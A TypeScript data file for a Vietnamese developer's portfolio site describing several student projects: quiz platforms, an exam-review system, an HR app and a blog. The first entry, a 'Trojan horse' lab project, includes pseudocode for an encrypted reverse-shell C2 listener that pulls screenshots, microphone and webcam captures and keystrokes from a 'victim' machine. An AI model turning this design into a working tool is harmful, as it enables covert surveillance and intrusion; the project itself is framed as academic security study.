export type Project = {
  id: string
  name: string
  summary: string
  tech: string[]
  link?: string
  details?: string
  sections?: { id: string; title: string; content?: string; image?: string }[]
  categories: Array<'Web' | 'Desktop' | 'Mobile' | 'Api'>
  status: 'Completed'
}

import hackingImg1 from '../assets/hacking/hacking1.jpg'
import hackingImg2 from '../assets/hacking/hacking2.png'
import hackingImg3 from '../assets/hacking/hacking3.jpg'
import phuckhao1 from '../assets/phuckhao/phuckhao1.png'
import phuckhao2 from '../assets/phuckhao/phuckhao2.png'

// Mobile quiz app images
import mobileLoginScreen from '../assets/mobile/login-screen.png'
import mobileHomeDashboard from '../assets/mobile/home-dashboard.png'
import mobileEnterRoomCode from '../assets/mobile/enter-room-code.png'
import mobileEnterExamRoom from '../assets/mobile/enter-exam-room.png'
import mobileStartExam from '../assets/mobile/start-exam.png'
import mobileQuestionList from '../assets/mobile/question-list.png'
import mobileSubmitProgress from '../assets/mobile/submit-progress.png'
import mobileExamResults from '../assets/mobile/exam-results.png'
import mobileReviewAfterSubmit from '../assets/mobile/review-after-submit.png'
import mobileExamHistory from '../assets/mobile/exam-history.png'
import mobileProfileFeatures from '../assets/mobile/profile-features.png'
import mobileSettingsFeatures from '../assets/mobile/settings-features.png'
// Ảnh chụp thật từ hệ thống đang chạy tại tracnghiem.online
import tnLanding from '../assets/tracnghiem/tn-landing.jpg'
import tnLoginPublic from '../assets/tracnghiem/tn-login.jpg'
import tnStudentHome from '../assets/tracnghiem/tn-student-home.jpg'
import tnExamCode from '../assets/tracnghiem/tn-exam-code.jpg'
import tnExamInfo from '../assets/tracnghiem/tn-exam-info.jpg'
import tnExamTaking from '../assets/tracnghiem/tn-exam-taking.jpg'
import tnProfile from '../assets/tracnghiem/tn-profile.jpg'
import tnSettings from '../assets/tracnghiem/tn-settings.jpg'
import tnCalculator from '../assets/tracnghiem/tn-calculator.jpg'
import blogNatwoHome from '../assets/blognatwo/blog-home.jpg'

export const projects: Project[] = [
  {
    id: 'hacking-windows-trojan-horse',
    name: 'HACKING WINDOWS – TROJAN HORSE',
    summary: 'Mô phỏng tấn công Trojan trên Windows trong môi trường lab an toàn: tạo payload, ẩn tiến trình, thiết lập persistence và kênh liên lạc C2; tập trung vào kỹ thuật phòng thủ và phân tích hành vi.',
    tech: ['Python', 'AES Encryption', 'Networking', 'C2/Reverse Shell'],
    categories: ['Desktop'],
    status: 'Completed',
    details: `1.1 Tổng quan về đồ án\nChương 1: TỔNG QUAN\nĐồ án sẽ tập trung vào việc tìm hiểu các phương pháp khai thác lỗ hổng phổ biến trên hệ điều hành Windows, cụ thể là Hacking Windows. Hệ điều hành Windows là nền tảng phổ biến trên toàn cầu, vì vậy nó trở thành mục tiêu của nhiều vụ tấn công mạng. Đồ án sẽ cung cấp một cái nhìn tổng quan về hacker, các phương pháp hacking phổ biến trên Windows, kết hợp với các giải pháp bảo mật mạng và ngăn chặn các phần mềm độc hại.\n\n1.2 Nhiệm vụ đồ án\n- Nghiên cứu về hệ điều hành Windows và các đặc điểm bảo mật của nó.\n- Tìm hiểu về các loại hacker, động cơ của họ, và phương pháp tấn công phổ biến trên Windows.\n- Phân tích cách thức hoạt động của các loại phần mềm độc hại (malware) và các biện pháp bảo vệ.\n- Đưa ra các giải pháp phòng chống và các hành động hợp pháp liên quan đến việc bảo vệ hệ thống.\n\n1.3 Mục tiêu nghiên cứu\nMục tiêu chính: Nâng cao kiến thức về cách thức hacker có thể tấn công hệ thống Windows và phát triển các biện pháp bảo vệ hữu hiệu để ngăn chặn các cuộc tấn công mạng.\nMục tiêu phụ: Xây dựng nhận thức về việc cần thiết cập nhật và bảo vệ hệ thống, khuyến khích các doanh nghiệp và cá nhân chủ động trong việc phòng ngừa.\n\n1.4 Phương pháp nghiên cứu\n- Nghiên cứu tài liệu.\n- Phân tích case study.\n- Thực nghiệm trong môi trường giả lập an toàn.\n\n1.5 Công cụ nghiên cứu\n- Công cụ tấn công: Metasploit, John the Ripper, Hydra, Wireshark, Nmap.\n- Phần mềm bảo vệ: Kaspersky, Bitdefender, v.v.\n- Môi trường ảo hóa: VirtualBox/VMware.\n\n2. CƠ SỞ LÝ THUYẾT (rút gọn)\n- Hệ điều hành Windows: ưu/nhược điểm.\n- Khái niệm Hack/Hacker: White/Black/Gray Hat.\n- Hacking Windows: brute force, khai thác lỗ hổng, cài malware.\n- Malware: Virus, Trojan, Ransomware, Spyware (Trojan giả dạng phần mềm hợp pháp).\n- Biện pháp bảo vệ: cập nhật, antivirus, thận trọng tải file, sao lưu, 2FA, mã hóa, firewall.\n\n2.10 Kiến trúc xử lý Trojan (tổng quát)\n- Phát hiện → Phân tích (tĩnh/động/bộ nhớ) → Cách ly → Loại bỏ → Phục hồi & vá → Giám sát → Phòng ngừa.\n\n3. BIỆN PHÁP VÀ HÀNH ĐỘNG HỢP PHÁP\n- Cập nhật vá lỗi, antivirus, firewall, MFA, mã hóa, sao lưu.\n- Pentest hợp pháp, Ethical Hacking, Bug Bounty.\n\n4. DEMO\n- Bước 1: Xem thông tin hệ thống nạn nhân (systeminfo).\n- Bước 2: Các tác vụ sau khi kết nối thành công (điều khiển từ xa, chụp màn hình, ghi âm, webcam, keylog...).\n- Bước 3: Quản lý thư mục và tệp (dir, mkdir, rmdir).\n\n5. MÃ NGUỒN MÔ PHỎNG (PSEUDOCODE)\n\n// CẤU HÌNH KẾT NỐI\nKHỞI TẠO:\n    LHOST = "192.168.1.2"  // Địa chỉ IP máy tấn công\n    LPORT = 5555           // Cổng lắng nghe\n    KEY = "XichKhaoMaHau123"  // Khóa mã hóa AES (16 bytes)\n    IV = "XichKhaoMaHau321"   // Vector khởi tạo (16 bytes)\n\n// HÀM MÃ HÓA DỮ LIỆU\nFUNCTION encrypt(data, key, iv):\n    TẠO cipher = AES(key, CFB_MODE, iv)\n    encryptor = cipher.encryptor()\n    RETURN encryptor.update(data) + encryptor.finalize()\n\n// HÀM GIẢI MÃ DỮ LIỆU\nFUNCTION decrypt(data, key, iv):\n    TẠO cipher = AES(key, CFB_MODE, iv)\n    decryptor = cipher.decryptor()\n    RETURN decryptor.update(data) + decryptor.finalize()\n\n// THIẾT LẬP KẾT NỐI\nTẠO socket = TCP_SOCKET\nBIND socket TO (LHOST, LPORT)\nLISTEN socket\nIN "Đang chờ kết nối từ máy nạn nhân..."\nACCEPT connection FROM client\nIN "Đã kết nối từ: " + client_address\n\n// VÒNG LẶP XỬ LÝ LỆNH\nWHILE True:\n    NHẬP command = input("Nhập lệnh: ")\n    \n    IF command == "exit":\n        GỬI encrypt(command, KEY, IV) TO client\n        BREAK\n    \n    // MÃ HÓA VÀ GỬI LỆNH\n    encrypted_command = encrypt(command, KEY, IV)\n    GỬI encrypted_command TO client\n    \n    // XỬ LÝ CÁC LỆNH ĐẶC BIỆT\n    IF command IN ["screenshot", "record_mic", "webcam"]:\n        // NHẬN ĐỘ DÀI DỮ LIỆU\n        encrypted_length = NHẬN 4 bytes FROM client\n        length = UNPACK(encrypted_length)\n        \n        // NHẬN DỮ LIỆU ĐÃ MÃ HÓA\n        encrypted_result = NHẬN length bytes FROM client\n        result = decrypt(encrypted_result, KEY, IV)\n        \n        // LƯU FILE THEO LOẠI LỆNH\n        IF command == "screenshot":\n            LƯU result AS "screenshot.png" ON Desktop\n        ELSE IF command == "record_mic":\n            LƯU result AS "record.wav" ON Desktop\n        ELSE IF command == "webcam":\n            LƯU result AS "webcam.png" ON Desktop\n    \n    ELSE IF command == "keylog":\n        IN "Đang ghi lại các phím nhấn..."\n        WHILE True:\n            encrypted_result = NHẬN 4096 bytes FROM client\n            result = decrypt(encrypted_result, KEY, IV)\n            IN "[KEYLOG]: " + result\n    \n    ELSE:\n        // XỬ LÝ LỆNH THÔNG THƯỜNG\n        encrypted_result = NHẬN 4096 bytes FROM client\n        result = decrypt(encrypted_result, KEY, IV)\n        IN result\n\n// ĐÓNG KẾT NỐI\nĐÓNG client\nĐÓNG socket\n\n6. KẾT LUẬN\nNhấn mạnh nâng cao nhận thức, áp dụng biện pháp bảo vệ, tuân thủ pháp luật; nhận diện phishing và biến thể; tầm quan trọng của đào tạo và chính sách bảo mật.\n\nLưu ý: Nội dung chỉ phục vụ mục đích học thuật và demo trong môi trường kiểm thử hợp pháp.`,
    sections: [
      { id: 'hacking1', title: 'Xem thông tin hệ thống nạn nhân', content: 'Xem thông tin máy nạn nhân', image: hackingImg1 },
      { id: 'hacking2', title: 'Các tác vụ sau khi kết nối thành công', content: 'Sau khi kết nối được máy nạn nhân ta có thể thực hiện được các tác vụ', image: hackingImg2 },
      { id: 'hacking3', title: 'Quản lý thư mục và tệp trên máy nạn nhân', content: 'Xem thư mục trong máy nạn nhân với lệnh dir và có thể thêm thư mục và xóa thư mục trong máy nạn nhân với lệnh mkdir và rmdir', image: hackingImg3 }
    ]
  },
  {
    id: 'net-chat-java',
    name: 'Hệ thống quản lí nhân sự sử dụng winform devexpress',
    summary: 'Ứng dụng quản lý nhân sự xây dựng bằng WinForms + DevExpress: quản lý hồ sơ, phòng ban, chấm công và phân quyền cơ bản.',
    tech: ['C#', 'WinForms', 'DevExpress', 'SQL Server'],
    link: 'https://example.com/chat',
    categories: ['Desktop'],
    status: 'Completed'
  },
  {
    id: 'js-visualizer',
    name: 'Hệ thống hỗ trợ phúc khảo',
    summary: 'Nền tảng phúc khảo bài thi: portal web .NET cho quản trị, ứng dụng Flutter cho sinh viên đăng ký và theo dõi.',
    tech: ['C#', '.NET', 'Flutter', 'Dart'],
    categories: ['Web', 'Mobile', 'Api'],
    status: 'Completed',
    details: `Mục tiêu: số hóa quy trình phúc khảo để nhanh, minh bạch, dễ theo dõi.\n\nChức năng chính:\n- Sinh viên: đăng nhập, nộp đơn phúc khảo, theo dõi trạng thái, nhận thông báo.\n- Nhân viên: duyệt đơn, phân công giảng viên, thống kê, xác nhận điểm sau phúc khảo.\n- Giảng viên: xem đơn được phân công, chấm lại, gửi nhận xét/điểm.\n- Admin: quản lý người dùng, phân quyền, đợt phúc khảo, nhật ký hệ thống.\n\nPhạm vi: phúc khảo bài thi lý thuyết; triển khai web; chưa tích hợp LMS.\n\nLợi ích: giảm thủ tục giấy tờ, tăng minh bạch, quản trị tập trung, dễ báo cáo.\n\nĐịnh hướng mở rộng: tích hợp LMS, chữ ký số, đa kênh thông báo, tăng cường bảo mật.`,
    sections: [
      { id: 'phuckhao-home', title: 'Trang chủ', content: 'Giao diện trang chủ hệ thống phúc khảo.', image: phuckhao1 },
      { id: 'phuckhao-login', title: 'Trang đăng nhập', content: 'Giao diện đăng nhập người dùng.', image: phuckhao2 },
    ],
  },
  {
    id: 'react-portfolio',
    name: 'Hệ thống thi trắc nghiệm trực tuyến',
    summary: 'Nền tảng thi trực tuyến hiệu năng cao (tracnghiem.online): React 19 + Vite cho UI, backend .NET, Redis cache cho phiên/đề thi, RabbitMQ cho hàng đợi, SignalR giám sát realtime.',
    tech: ['C#', '.NET', 'React 19', 'TypeScript', 'SignalR', 'Redis', 'RabbitMQ', 'Docker'],
    link: 'https://tracnghiem.online',
    categories: ['Web', 'Api'],
    status: 'Completed',
    details: `Mục tiêu: xây dựng hệ thống thi trắc nghiệm cho phép tạo kỳ thi, quản lý ca thi, thí sinh đăng nhập, làm bài theo thời gian, tự động chấm điểm và trả kết quả tức thì. Triển khai thật tại tracnghiem.online.\n\nKiến trúc: front-end React 19 + Vite + TypeScript; API .NET tách lớp; Redis dùng làm cache phiên/đề thi để giảm truy vấn DB; RabbitMQ xử lý hàng đợi sự kiện như nộp bài, chấm điểm nền, ghi log; đóng gói Docker và chạy sau Cloudflare.\n\nRealtime: trang Monitor dùng SignalR cho giám thị theo dõi trạng thái thí sinh theo thời gian thực (đang làm, mất kết nối, nộp bài), thời lượng còn lại, số lần rời tab, sự kiện bất thường; bản đồ vị trí thí sinh (Leaflet) từ log truy cập.\n\nBảo mật & ổn định: đăng nhập Google OAuth + reCAPTCHA, chống refresh mất tiến độ, chống gian lận (random đề, trộn câu hỏi), autosave theo chu kỳ, theo dõi hoạt động; soạn đề với trình soạn thảo giàu định dạng và công thức toán (KaTeX), xuất Word/PDF.`,
    sections: [
      { id: 'quiz-landing', title: 'Trang chủ hệ thống', image: tnLanding, content: 'Trang chủ công khai tại tracnghiem.online giới thiệu hệ thống thi trắc nghiệm trực tuyến với giám sát chống gian lận, quản lý đề thi/phòng thi/kết quả tự động và trả kết quả ngay sau khi nộp bài. Giao diện thân thiện kèm playlist nhạc lofi hỗ trợ tập trung khi luyện tập.' },
      { id: 'quiz-login-public', title: 'Đăng nhập làm kiểm tra', image: tnLoginPublic, content: 'Form đăng nhập để làm kiểm tra (tên đăng nhập/email + mật khẩu, quên mật khẩu, liên hệ admin để được cấp bài test). Phiên đăng nhập được lưu trong Redis để ổn định và truy cập nhanh.' },
      { id: 'quiz-student-home', title: 'Trang chủ sau đăng nhập', image: tnStudentHome, content: 'Sau khi đăng nhập, sinh viên thấy trang chủ với lời chào, khu vực theo dõi bài tập và các tính năng chính của hệ thống; thanh điều hướng hiển thị tên người dùng đang đăng nhập.' },
      { id: 'quiz-exam-code', title: 'Nhập mã ca thi', image: tnExamCode, content: 'Trang "Làm kiểm tra": sinh viên nhập mã ca thi do giáo viên cung cấp để tìm và tham gia bài thi. Mã ca thi được kiểm tra định dạng (chỉ chữ, số và dấu gạch nối).' },
      { id: 'quiz-exam-info', title: 'Thông tin ca thi', image: tnExamInfo, content: 'Sau khi nhập đúng mã, hệ thống hiển thị thông tin ca thi: môn thi, thời lượng, thời gian bắt đầu và nút "Bắt đầu làm bài". Ảnh chụp thật ca thi môn Lập trình hướng đối tượng.' },
      { id: 'quiz-exam-taking', title: 'Giao diện làm bài thi', image: tnExamTaking, content: 'Giao diện làm bài thật với 56 câu hỏi: đề được trộn (hoán vị), bảng câu hỏi cho phép nhảy nhanh giữa các câu, đánh dấu ghim câu cần xem lại, panel thông tin thí sinh và bộ đếm thời gian. Đề thi và đáp án được trộn để đảm bảo công bằng, autosave tiến độ.' },
      { id: 'quiz-profile', title: 'Thông tin cá nhân', image: tnProfile, content: 'Trang hồ sơ sinh viên: họ tên, mã số sinh viên, email, vai trò cùng các chức năng chỉnh sửa hồ sơ và đổi mật khẩu.' },
      { id: 'quiz-settings', title: 'Cài đặt hệ thống', image: tnSettings, content: 'Bảng cài đặt cá nhân hóa không gian làm việc: chọn font hệ thống, đổi ngôn ngữ (Việt/Anh/Trung/Nhật), thú cưng và hiệu ứng giao diện.' },
      { id: 'quiz-calculator', title: 'Máy tính công cụ học tập', image: tnCalculator, content: 'Công cụ máy tính tích hợp ngay trong trang, hỗ trợ thí sinh tính toán nhanh khi luyện tập mà không cần rời khỏi hệ thống.' },
    ]
  },
  {
    id: 'flutter-quiz-app',
    name: 'Ứng dụng thi trắc nghiệm (Mobile - Flutter/Dart)',
    summary: 'Ứng dụng thi trắc nghiệm di động xây dựng bằng Flutter/Dart: đăng nhập, làm bài, chấm điểm và xem kết quả.',
    tech: ['Flutter', 'Dart'],
    categories: ['Mobile'],
    status: 'Completed',
    details: `Ứng dụng thi trắc nghiệm di động được phát triển bằng Flutter/Dart với các tính năng chính:

Tính năng chính:
- Đăng nhập và xác thực người dùng
- Nhập mã phòng thi để tham gia bài thi
- Làm bài thi với giao diện thân thiện
- Hiển thị tiến độ làm bài và thời gian còn lại
- Nộp bài và xem kết quả ngay lập tức
- Xem lại câu hỏi sau khi nộp bài
- Xem lịch sử các lần làm bài
- Quản lý hồ sơ cá nhân với nhiều chức năng
- Cài đặt ứng dụng với các tùy chọn đa dạng

Công nghệ sử dụng:
- Flutter: Framework phát triển ứng dụng di động đa nền tảng
- Dart: Ngôn ngữ lập trình chính của Flutter
- State Management: Quản lý trạng thái ứng dụng
- Local Storage: Lưu trữ dữ liệu cục bộ
- HTTP Client: Giao tiếp với API backend

Giao diện người dùng:
- Thiết kế Material Design hiện đại
- Responsive layout phù hợp với nhiều kích thước màn hình
- Animation mượt mà và trải nghiệm người dùng tốt
- Dark/Light theme support`,
    sections: [
      { 
        id: 'mobile-login', 
        title: 'Màn hình đăng nhập', 
        content: 'Giao diện đăng nhập với thiết kế Material Design hiện đại, hỗ trợ đăng nhập bằng tài khoản và mật khẩu.', 
        image: mobileLoginScreen 
      },
      { 
        id: 'mobile-dashboard', 
        title: 'Trang chủ Dashboard', 
        content: 'Màn hình chính hiển thị thông tin tổng quan, các bài thi có sẵn và thông báo quan trọng.', 
        image: mobileHomeDashboard 
      },
      { 
        id: 'mobile-room-code', 
        title: 'Nhập mã phòng thi', 
        content: 'Giao diện nhập mã phòng thi để tham gia vào bài thi được tổ chức.', 
        image: mobileEnterRoomCode 
      },
      { 
        id: 'mobile-exam-room', 
        title: 'Vào phòng thi', 
        content: 'Màn hình xác nhận thông tin phòng thi và chuẩn bị bắt đầu làm bài.', 
        image: mobileEnterExamRoom 
      },
      { 
        id: 'mobile-start-exam', 
        title: 'Bắt đầu thi', 
        content: 'Giao diện hiển thị thông tin bài thi và nút bắt đầu làm bài.', 
        image: mobileStartExam 
      },
      { 
        id: 'mobile-question-list', 
        title: 'Danh sách câu hỏi', 
        content: 'Hiển thị danh sách các câu hỏi trong bài thi với trạng thái đã làm/chưa làm.', 
        image: mobileQuestionList 
      },
      { 
        id: 'mobile-submit-progress', 
        title: 'Tiến độ nộp bài', 
        content: 'Hiển thị tiến độ khi người dùng nhấn nộp bài với animation loading.', 
        image: mobileSubmitProgress 
      },
      { 
        id: 'mobile-exam-results', 
        title: 'Kết quả bài thi', 
        content: 'Màn hình hiển thị kết quả chi tiết sau khi nộp bài với điểm số và đáp án.', 
        image: mobileExamResults 
      },
      { 
        id: 'mobile-review-after-submit', 
        title: 'Xem lại sau nộp bài', 
        content: 'Chức năng cho phép xem lại các câu hỏi và đáp án sau khi đã nộp bài.', 
        image: mobileReviewAfterSubmit 
      },
      { 
        id: 'mobile-exam-history', 
        title: 'Lịch sử làm bài', 
        content: 'Xem lịch sử các lần làm bài trước đó với điểm số và thời gian.', 
        image: mobileExamHistory 
      },
      { 
        id: 'mobile-profile-features', 
        title: 'Hồ sơ cá nhân', 
        content: 'Quản lý hồ sơ cá nhân với nhiều chức năng như thay đổi thông tin, xem thống kê.', 
        image: mobileProfileFeatures 
      },
      { 
        id: 'mobile-settings-features', 
        title: 'Cài đặt ứng dụng', 
        content: 'Cài đặt ứng dụng với nhiều tùy chọn như theme, thông báo, ngôn ngữ.', 
        image: mobileSettingsFeatures
      }
    ]
  },
  {
    id: 'blog-natwo',
    name: 'Blog & Portfolio cá nhân (blog-natwo)',
    summary: 'Trang blog kiêm portfolio cá nhân xây bằng React 19 + Vite + TypeScript + Tailwind, hiệu ứng 3D với Three.js, hỗ trợ song ngữ Việt/Anh, triển khai trên Vercel.',
    tech: ['React 19', 'Vite', 'TypeScript', 'Tailwind CSS', 'Three.js', 'Framer Motion', 'i18next', 'Vercel'],
    link: 'https://blog-natwo.vercel.app',
    categories: ['Web'],
    status: 'Completed',
    details: `Trang cá nhân giới thiệu kiến thức lập trình và các dự án của bản thân, đồng thời là nơi tổng hợp portfolio.\n\nCông nghệ: React 19 + Vite + TypeScript, Tailwind CSS cho giao diện; Three.js (@react-three/fiber, drei) và Framer Motion, GSAP cho hiệu ứng 3D và chuyển động; react-router-dom cho điều hướng; react-markdown + rehype-highlight cho bài viết; i18next hỗ trợ song ngữ Việt/Anh.\n\nChức năng: trang chủ với hiệu ứng động, danh sách Blog, trang Projects (portfolio), About và timeline theo năm.\n\nTriển khai: build tĩnh và deploy trên Vercel, tự động deploy mỗi khi push lên nhánh main của GitHub.`,
    sections: [
      { id: 'blog-home', title: 'Trang chủ', image: blogNatwoHome, content: 'Trang chủ với nền không gian động và hiệu ứng 3D, tiêu đề "Programming knowledge & personal projects", điều hướng tới Blog, Projects, About và nút chuyển ngôn ngữ Việt/Anh.' },
    ],
  },
]

